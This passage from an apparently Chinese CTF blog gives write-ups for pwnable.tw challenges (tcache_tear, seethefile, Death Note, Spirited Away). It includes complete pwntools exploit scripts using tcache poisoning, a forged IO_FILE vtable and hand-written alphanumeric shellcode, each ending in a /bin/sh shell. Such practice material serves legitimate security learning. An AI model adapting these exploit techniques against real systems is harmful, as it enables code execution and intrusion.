<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./tcache_tear&#x27;)</span><br><span class="line">#io=remote(&#x27;chall.pwnable.tw&#x27; ,10207)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">heap=0x602060</span><br><span class="line">elf=ELF(&#x27;./tcache_tear&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	io.sendlineafter(&#x27;choice :&#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">	io.sendlineafter(&#x27;Data:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele():</span><br><span class="line">	io.sendlineafter(&#x27;choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">	io.sendlineafter(&#x27;choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line">	</span><br><span class="line">def exp():</span><br><span class="line">	io.sendlineafter(&#x27;Name:&#x27;,p64(0)+p64(0x421))</span><br><span class="line">	add(0x78,&#x27;a&#x27;)</span><br><span class="line">	dele()</span><br><span class="line">	dele()</span><br><span class="line">	add(0x78,p64(heap+0x420))</span><br><span class="line">	add(0x78,&#x27;a&#x27;)	</span><br><span class="line">	add(0x78,p64(0)+p64(0x21))#+p64(0)+p64(0)+p64(0)+p64(0x21))</span><br><span class="line">	add(0x68,&#x27;a&#x27;)</span><br><span class="line">	dele()</span><br><span class="line">	dele()</span><br><span class="line">	add(0x68,p64(heap+0x10))</span><br><span class="line">	add(0x68,&#x27;a&#x27;)</span><br><span class="line">	add(0x68,&#x27;heap&#x27;)</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	dele()</span><br><span class="line">	show()</span><br><span class="line">	malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">	libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">	add(0x38,&#x27;a&#x27;)</span><br><span class="line">	dele()</span><br><span class="line">	dele()</span><br><span class="line">	add(0x38,p64(free_hook-8))</span><br><span class="line">	add(0x38,&#x27;a&#x27;)</span><br><span class="line">	add(0x38,&#x27;/bin/sh\x00&#x27;+p64(system))</span><br><span class="line">	dele()</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="4-seethefile（伪造IO-FILE结构体）"><a href="#4-seethefile（伪造IO-FILE结构体）" class="headerlink" title="4.seethefile（伪造IO_FILE结构体）"></a>4.seethefile（伪造IO_FILE结构体）</h3><p>这个题实现了一个可以读取并输出服务器上的任意文件的功能。漏洞点在退出时的scanf(“%s”,name)这里没有对长度进行限制可以溢出，可以覆盖掉fp这个IO_FILE指针，我们只需要伪造一个IO_FILE结构就行。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027214805158.png" alt="image-20211027214805158"></p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027215049499.png" alt="image-20211027215049499"></p>
<p>fopen函数的操作简单概括就是：</p>
<ul>
<li>使用 malloc 分配 FILE 结构</li>
<li>设置 FILE 结构的 vtable</li>
<li>初始化分配的 FILE 结构</li>
<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
<li>调用系统调用打开文件</li>
</ul>
<p>fclose函数的源码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  int status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line">#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span><br><span class="line">  /* We desperately try to help programs which are using streams in a</span><br><span class="line">     strange way and mix old and new functions.  Detect old streams</span><br><span class="line">     here.  */</span><br><span class="line">  if (_IO_vtable_offset (fp) != 0)</span><br><span class="line">    return _IO_old_fclose (fp);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /* First unlink the stream.  */</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)//_IO_IS_FILEBUF的值为0x2000</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  if (fp-&gt;_mode &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">#if _LIBC</span><br><span class="line">      /* This stream has a wide orientation.  This means we have to free</span><br><span class="line">	 the conversion functions.  */</span><br><span class="line">      struct _IO_codecvt *cc = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      if (_IO_have_backup (fp))</span><br><span class="line">	_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = 0;</span><br><span class="line">      free(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见fclose函数将会调用<code>_IO_FINISH (fp)</code>函数，其存在于vtable需表中，而vtable就存在于_IO_FILE_plus中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>我们在构造_IO_FILE结构体主要就是伪造一个vtable表，将_IO_FINISH()覆盖为system的值即可。</p>
<p>现在我们需要先泄露出libc的基地址，因为可以读取并输出任意文件，而libc等文件信息一般被放在/proc/<pid>/maps中，这里的pid替换为self。因此我们读取他就可以拿到libc的基地址。</pid></p>
<p>从源码中我们可以看出如果_IO_file_flags&amp;0x2000=0就可以绕过前面两个if直接执行_IO_FINISH函数。因此我们只要把_IO_file_flags的值覆盖为满足条件的值即可，且不能有\x00，不然将无法执行后面的；sh\x00。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027221010581.png" alt="image-20211027221010581"></p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./seethefile&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10200)</span><br><span class="line">elf=ELF(&#x27;./seethefile&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def opens(filename):</span><br><span class="line">	io.recvuntil(&#x27;Your choice :&#x27;)</span><br><span class="line">	io.sendline(&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;What do you want to see :&#x27;,filename)</span><br><span class="line">	</span><br><span class="line">def reads():</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def writes():</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def closes():</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	opens(&#x27;/proc/self/maps&#x27;)	</span><br><span class="line">	reads()</span><br><span class="line">	writes()</span><br><span class="line">	io.recvline()</span><br><span class="line">	io.recvline()</span><br><span class="line">	io.recvline()</span><br><span class="line">	heap_addr=int(io.recv(8),16)+0x1010</span><br><span class="line">	io.recvline()</span><br><span class="line">	libc_base=int(io.recv(8),16)+0x1000</span><br><span class="line">	print(&#x27;heap_addr&#x27;,hex(heap_addr))</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">	</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;5&#x27;)</span><br><span class="line">	payload=&#x27;a&#x27;*0x20+p32(0x804b290)+p32(0)*3</span><br><span class="line">	payload+=p32(0xFBAD1C58)+&#x27;;sh\x00&#x27;+p32(heap_addr+0x560)+p32(heap_addr+0x160)*5</span><br><span class="line">	payload+=p32(heap_addr+0x560)+p32(0)*4</span><br><span class="line">	payload+=p32(libc_base+libc.symbols[&#x27;_IO_2_1_stderr_&#x27;])+p32(3)</span><br><span class="line">	payload+=p32(0)*3+p32(heap_addr+0x98)+p32(0xffffffff)*2</span><br><span class="line">	payload+=p32(0)+p32(heap_addr+0xa4)+p32(0)*3+p32(0xffffffff)</span><br><span class="line">	payload+=p32(0)*10+p32(0x804b290+0xb8)+p64(0)*4</span><br><span class="line">	payload+=p32(0)*2+p32(system)</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	io.sendlineafter(&#x27;name :&#x27;,payload)</span><br><span class="line">	</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="5-Death-Note-alpha-shellcode的编写"><a href="#5-Death-Note-alpha-shellcode的编写" class="headerlink" title="5.Death Note(alpha_shellcode的编写)"></a>5.Death Note(alpha_shellcode的编写)</h3><p>可以看见v1是int类型，因此当v1为负数时，就可以修改got表。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028194544373.png" alt="image-20211028194544373"></p>
<p>因此将堆指针覆盖掉free的got地址，然后调用free函数时eip就直接跳转到堆上执行，因此我们只需要在堆上写shellcode即可。</p>
<p>但这里有个检查，shellcode必须是可显示字符。</p>
<p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028203053901.png" alt="image-20211028203053901"></p>
<p>这种shellcode被称为alpha_shellcode,写这种shellcode有两种方法，一种是用alpha3这个工具写，但写出的shellcode太长需要两百多字节，所以在这里我们考虑第二种方法手写。</p>
<p>网上有大佬将可以用到的汇编指令都罗列了下来，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1.数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line">2.算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">3.逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">4.比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">5.转移指令:</span><br><span class="line">push 56h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, 43h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line">6.交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">xor byte ptr [esp], ah // al ^= ah</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">7.清零:</span><br><span class="line">push 44h</span><br><span class="line">pop eax</span><br><span class="line">sub al, 44h ; eax = 0</span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = 0</span><br></pre></td></tr></table></figure>

<p>因此，我们就可以利用这些指令写出我们的shellcode</p>
<p>exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./death_note&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10201)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line">	io.sendlineafter(&#x27;Name :&#x27;,name)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">	io.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	payload=&#x27;&#x27;&#x27;</span><br><span class="line">	#eax初始就有堆的地址</span><br><span class="line">	xor al,0x77;</span><br><span class="line">	inc eax;</span><br><span class="line">	push eax;</span><br><span class="line">	pop ecx;</span><br><span class="line">	xor al,0x20;</span><br><span class="line">	push eax;</span><br><span class="line">	pop edx;</span><br><span class="line">	xor al,0x20;</span><br><span class="line">	dec eax;</span><br><span class="line">	xor al,0x77;</span><br><span class="line">	</span><br><span class="line">	xor [eax+0x26],cl;</span><br><span class="line">	xor [eax+0x27],dl;</span><br><span class="line">	xor al,0x58;</span><br><span class="line">	push eax;</span><br><span class="line">	pop ebx;</span><br><span class="line">	push 0x56;</span><br><span class="line">	pop eax;</span><br><span class="line">	sub al,0x56;</span><br><span class="line">	push eax;</span><br><span class="line">	pop ecx;</span><br><span class="line">	push eax;</span><br><span class="line">	pop edx;</span><br><span class="line">	push 0x2c;</span><br><span class="line">	pop eax;</span><br><span class="line">	sub al,0x21;</span><br><span class="line">	&#x27;&#x27;&#x27;</span><br><span class="line">	payload=asm(payload)+&#x27;\x4d\x20&#x27;</span><br><span class="line">	payload+=&#x27;/bin/sha&#x27;*4+&#x27;/bin/sh&#x27;</span><br><span class="line">	print(len(payload))</span><br><span class="line">	add(-19,payload)</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	dele(-19)</span><br><span class="line"></span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="7-Spirited-Away"><a href="#7-Spirited-Away" class="headerlink" title="7.Spirited Away"></a>7.Spirited Away</h3><p>这个题的代码虽然少，但是漏洞隐藏的却很深，我前前后后读了很多遍代码，主函数如下，我发现只对nbytes和v3只进行了一次赋值，这样很容易修改他俩的值，如果能修改就好了，然后看要怎么才能修改他们，很自然的就往v1数组看去，发现他的大小只有56，但存储的字符出去数字就有55的长度，说明只能存储一位数的数字，如果有两位甚至三位数字就会溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">int survey()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[56]; // [esp+10h] [ebp-E8h] BYREF</span><br><span class="line">  size_t nbytes; // [esp+48h] [ebp-B0h]</span><br><span class="line">  size_t v3; // [esp+4Ch] [ebp-ACh]</span><br><span class="line">  char s[80]; // [esp+50h] [ebp-A8h] BYREF</span><br><span class="line">  int v5; // [esp+A0h] [ebp-58h] BYREF</span><br><span class="line">  void *buf; // [esp+A4h] [ebp-54h]</span><br><span class="line">  char v7[80]; // [esp+A8h] [ebp-50h] BYREF</span><br><span class="line"></span><br><span class="line">  nbytes = 0x3C;</span><br><span class="line">  v3 = 0x50;</span><br><span class="line">LABEL_2:</span><br><span class="line">  memset(s, 0, sizeof(s));</span><br><span class="line">  buf = malloc(0x3Cu);</span><br><span class="line">  printf(&quot;\nPlease enter your name: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, buf, nbytes);</span><br><span class="line">  printf(&quot;Please enter your age: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">  printf(&quot;Why did you came to see this movie? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, v7, v3);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  printf(&quot;Please enter your comment: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  printf(&quot;Name: %s\n&quot;, (const char *)buf);</span><br><span class="line">  printf(&quot;Age: %d\n&quot;, v5);</span><br><span class="line">  printf(&quot;Reason: %s\n&quot;, v7);</span><br><span class="line">  printf(&quot;Comment: %s\n\n&quot;, s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  sprintf(v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">  puts(v1);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  if ( cnt &gt; 199 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;200 comments is enough!&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    read(0, &amp;choice, 3u);</span><br><span class="line">    if ( choice == 89 || choice == 121 )</span><br><span class="line">    &#123;</span><br><span class="line">      free(buf);</span><br><span class="line">      goto LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice == 78 || choice == 110 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Wrong choice.&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye!&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当cnt为两位数时，那么’\x00’将会覆盖nbytes，当cnt为三位数时，那么’n‘也就是’\x6e‘将会覆盖nbytes，这时就可以溢出来覆盖堆指针buf了。</p>
<p>接下来需要思考将堆指针指向哪，由于free之后立马又malloc了，因此可以在栈上伪造chunk，然后再申请回来，v7离ebp最近，同时我们也可以控制v7的数据，在v7中伪造chunk，然后再利用堆溢出，这样就能改写返回地址了。因为是libc-2.23，unlink操作中没有判断netxchunk的nextchunk，因此我们只需要在fakechunk下写上p32(0)+p32(0x11)就绕过，使栈上的chunk被放入fastbin中。</p>
